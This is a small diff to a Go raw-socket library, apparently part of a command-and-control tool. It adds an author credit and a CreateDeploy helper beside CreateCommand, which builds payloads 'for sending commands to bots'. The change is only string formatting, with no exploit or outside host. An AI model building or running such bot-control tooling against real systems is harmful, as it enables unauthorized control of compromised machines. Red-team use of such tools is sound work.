@@ -2,6 +2,7 @@ package rawsocket
 
 /* CatTails rawsockets library yoinked and modified for this tool
    Source : github.com/oneNutW0nder/CatTails/cattails
+   Author : oneNutW0nder
 */
 
 import (
@@ -404,6 +405,11 @@ func CreateHello(hostMAC net.HardwareAddr, srcIP net.IP) (hello string) {
 // CreateCommand creates the payload for sending commands to bots
 func CreateCommand(cmd string) (command string) {
 	command = "COMMAND: " + cmd
+	return command
+}
+
+func CreateDeploy(path string) (command string) {
+	command = "DEPLOY: " + path
 	return command
 }
 
